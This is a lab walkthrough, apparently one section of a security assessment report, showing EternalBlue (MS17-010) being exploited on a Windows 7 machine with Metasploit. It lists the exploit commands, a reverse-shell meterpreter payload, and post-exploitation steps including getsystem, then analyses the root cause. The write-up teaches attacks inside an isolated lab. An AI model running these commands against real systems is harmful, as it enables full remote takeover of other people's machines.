# 04. EternalBlue Exploitation ğŸ’¥

This section demonstrates how the **EternalBlue (MS17-010)** exploit is executed on the  
vulnerable Windows 7 system using the **Metasploit Framework**.  
All actions were performed safely inside an isolated lab environment. ğŸ”’

---

## 1. Objective ğŸ¯

The goal of this phase is to:

- Gain remote access to the Windows 7 machine  
- Demonstrate how EternalBlue achieves RCE (Remote Code Execution)  
- Understand the exploitation workflow  
- Validate the vulnerability confirmed during scanning  

---

## 2. Starting Metasploit Framework ğŸš€

Launch Metasploit on Kali Linux:
msfconsole


When the console loads, use the EternalBlue exploit module:
use exploit/windows/smb/ms17_010_eternalblue

---

## 3. Configuring the Exploit âš™ï¸

Set the required options:

### 3.1 Set the Target IP
set RHOSTS 192.168.56.10

### 3.2 Set the Payload  
The `windows/x64/meterpreter/reverse_tcp` payload is typically used:

set payload windows/x64/meterpreter/reverse_tcp

### 3.3 Set the Attacker IP
set LHOST 192.168.56.20

### 3.4 Verify Settings

You should see correct **RHOST**, **LHOST**, and **payload** values.

---

## 4. Launch the Exploit ğŸ”«

Run the exploit:
exploit


If successful, the console will display:
Sending stage (200262 bytes) to 192.168.56.10
Meterpreter session 1 opened!

ğŸ‰ **This means the exploit worked and remote access is gained.**

---

## 5. Post-Exploitation Access ğŸ–¥ï¸

You now have a **Meterpreter session** with full control of the system.

### 5.1 Check System Information
sysinfo

Expected:
OS: Windows 7 SP1
### 5.2 List Files
ls
### 5.3 Take a Screenshot ğŸ“¸
screenshot
### 5.4 Get Command Shell
shell

Now you have full cmd.exe access with user-level privileges.

---

## 6. Privilege Escalation (Optional) ğŸ”¼

To gain **SYSTEM** (highest) privileges:

getsystem

If successful:
...got system (via technique 1)!

This confirms full machine compromise.

---

## 7. Persistence Techniques (Optional) ğŸ›‘

âš ï¸ **For educational awareness only. Do NOT use maliciously.**

Common persistence examples:

- Creating a new user  
- Adding startup scripts  
- Deploying backdoors  

These were **not** executed in this assessment to keep the environment clean.

---

## 8. Root Cause Analysis ğŸ§©

The exploitation succeeded because the system had:

- SMBv1 enabled  
- No MS17-010 patch installed  
- Port 445 exposed  
- Weak memory protections in SMB driver  

This allowed EternalBlue to trigger a buffer overflow and execute remote code.

---

## 9. Summary ğŸ“

The EternalBlue exploit successfully:

- Connected to SMBv1  
- Triggered the MS17-010 vulnerability  
- Injected a malicious payload  
- Opened a remote Meterpreter session  
- Allowed full control of Windows 7  

This confirms the Windows 7 system is highly vulnerable without patching.

The next phase validates how applying Microsoftâ€™s patch stops the attack.
